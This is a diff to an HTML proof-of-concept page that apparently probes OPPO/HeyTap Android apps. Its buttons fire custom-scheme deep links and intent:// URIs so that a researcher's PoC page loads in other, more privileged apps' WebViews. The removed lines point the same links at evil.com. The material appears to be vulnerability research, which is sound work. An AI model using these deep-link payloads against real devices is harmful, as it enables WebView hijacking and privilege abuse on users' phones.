@@ -83,22 +83,37 @@
     </div>
 
     <div class="card">
-        <h3>2. Deep Links (Other Apps)</h3>
+        <h3>2. Open PoC in OTHER App's WebView</h3>
+        <p style="color:#94a3b8;font-size:0.8em;">Try to open index.html in a more privileged WebView</p>
         <div class="section">
-            <button onclick="tryLink('htcloud://cloud.heytap.com/route?url=https://evil.com')">
-                ☁️ htcloud:// with URL param
+            <button
+                onclick="tryLink('htcloud://cloud.heytap.com/route?url=https://youichi-uda.github.io/oppo-game-poc/')">
+                ☁️ htcloud:// → PoC
             </button>
-            <button onclick="tryLink('heytapbrowser://webpage/view?url=https://evil.com')">
-                🌐 heytapbrowser:// Open URL
+            <button onclick="tryLink('oaps://theme/web?url=https://youichi-uda.github.io/oppo-game-poc/')">
+                🎨 oaps://theme → PoC
             </button>
-            <button onclick="tryLink('healthcheck://remotediagnosis.verify')">
-                🏥 healthcheck:// HtmlActivity
+            <button onclick="tryLink('heytapbrowser://webpage/view?url=https://youichi-uda.github.io/oppo-game-poc/')">
+                🌐 heytapbrowser:// → PoC
             </button>
-            <button onclick="tryLink('fat://fb/main')">
-                📝 fat://fb/main FeedbackActivity
+            <button
+                onclick="tryLink('healthcheck://remotediagnosis.verify?url=https://youichi-uda.github.io/oppo-game-poc/')">
+                🏥 healthcheck:// → PoC
             </button>
-            <button onclick="tryLink('account://login')">
-                👤 account:// Login
+            <button onclick="tryLink('postmanservice://open?url=https://youichi-uda.github.io/oppo-game-poc/')">
+                📬 postmanservice:// → PoC
+            </button>
+            <button
+                onclick="tryLink('intent://youichi-uda.github.io/oppo-game-poc/#Intent;scheme=https;package=com.heytap.cloud;end')">
+                ☁️ intent → HeytapCloud
+            </button>
+            <button
+                onclick="tryLink('intent://youichi-uda.github.io/oppo-game-poc/#Intent;scheme=https;package=com.oplus.themestore;end')">
+                🎨 intent → ThemeStore
+            </button>
+            <button
+                onclick="tryLink('intent://youichi-uda.github.io/oppo-game-poc/#Intent;scheme=https;action=android.intent.action.VIEW;end')">
+                � intent → any browser
             </button>
         </div>
     </div>
